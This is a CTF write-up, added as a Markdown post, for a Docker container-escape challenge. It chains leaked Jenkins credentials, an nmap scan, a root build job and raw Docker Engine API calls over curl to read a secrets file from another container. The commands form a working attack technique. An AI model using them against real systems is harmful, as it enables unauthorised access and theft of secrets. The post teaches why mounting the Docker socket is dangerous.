@@ -1,0 +1,94 @@
+---
+title: "NMCTF: Dockyard — container escape via Docker socket abuse"
+date: "2026-06-21"
+platform: "NMCTF"
+difficulty: "medium-hard"
+tags: ["docker", "jenkins", "container-escape", "devsecops"]
+excerpt: "The challenge I authored for NMCTF: jumpbox → leaked Jenkins creds → mounted Docker socket → raw Engine API over curl → vault container looted."
+---
+
+> **Category:** Misc / DevSecOps — requires Jenkins/Docker knowledge | **Flag:** `nmctf{n3v3r_m0unt_d0ck3r_s0ck}`
+
+Dockyard is a realistic pentest scenario I built for NMCTF: move through the network, chain misconfigurations, and break out of a container through a mounted Docker socket. This is the official writeup.
+
+## the setup
+
+Players SSH into a jumpbox as `ctf`. Somewhere on the internal network there's a Jenkins instance and a `secure-vault` container holding the flag via Docker secrets.
+
+## step 1 — enumeration
+
+Standard recon on the jumpbox:
+
+```bash
+whoami; id; uname -a
+ls -la
+```
+
+The `ctf` user is low privilege, but the box contains files worth reading. That is the attack surface.
+
+## step 2 — the developer left notes
+
+`developer_notes.txt` in the home directory reads:
+
+```
+Hey Karim,
+Vault container is live. Secret's loaded via Docker secrets as discussed. Jenkins is great!
+I removed the docker binary from it so interns can't mess with production containers again.
+Creds are still the temp ones: admin / 4mdj4d_dz_sec_2026
+I'll rotate them after the audit. Don't remind me.
+```
+
+Four gifts: a Jenkins instance exists, temp creds `admin / 4mdj4d_dz_sec_2026`, the `docker` binary was removed but **the socket is still mounted**, and a vault container holds the secret.
+
+## step 3 — find Jenkins, port forward, log in
+
+```bash
+ip addr show
+nmap -T4 172.20.0.0/24        # Jenkins found on 172.20.0.3:8080
+ssh -L 8080:jenkins:8080 ctf@localhost -p 9134
+```
+
+Open `http://localhost:8080`, log in with the leaked creds. An existing `deploy-vault` job's console output reveals the target container `secure-vault`, running Alpine, with the secret mounted at `/run/secrets/audit_token`.
+
+## step 4 — malicious build job
+
+Create a Freestyle project with an **Execute shell** step:
+
+```bash
+whoami
+ls -la /var/run/
+```
+
+Console output: the job runs as **root**, `docker.sock` exists, and the `docker` CLI is absent. That was the whole trap — **the socket is there, the binary isn't.**
+
+## step 5 — raw Docker API over curl
+
+The socket speaks plain HTTP. `curl --unix-socket` is all you need:
+
+```bash
+# list containers
+curl -s --unix-socket /var/run/dind/docker.sock \
+  http://localhost/containers/json?all=true | jq .
+
+# pull the flag file straight out of secure-vault (returns a tar stream)
+curl -s --unix-socket /var/run/dind/docker.sock \
+  "http://localhost/containers/<id>/archive?path=/run/secrets/audit_token" | tar -xO
+```
+
+Output: `nmctf{n3v3r_m0unt_d0ck3r_s0ck}`
+
+An alternative path uses the **Exec API** (`POST /containers/secure-vault/exec` → `POST /exec/<id>/start`) to run `cat /run/secrets/audit_token` inside the container.
+
+## why this works
+
+Mounting `/var/run/docker.sock` into a container hands over full control of the Docker daemon: list, inspect, exec, and create containers with arbitrary mounts — including the host filesystem. Removing the `docker` binary is security theater; the API is HTTP over a Unix socket, and `curl` is everywhere.
+
+The flag says it all: **never mount the docker socket.**
+
+## tl;dr
+
+1. Enumerate the jumpbox → `developer_notes.txt` leaks Jenkins creds.
+2. `nmap` the subnet → Jenkins on 8080 → SSH tunnel → log in.
+3. Build job runs shell as root → `docker.sock` mounted, no CLI.
+4. Talk to the Engine API with `curl --unix-socket`.
+5. `GET /containers/<id>/archive?path=/run/secrets/audit_token` → flag.
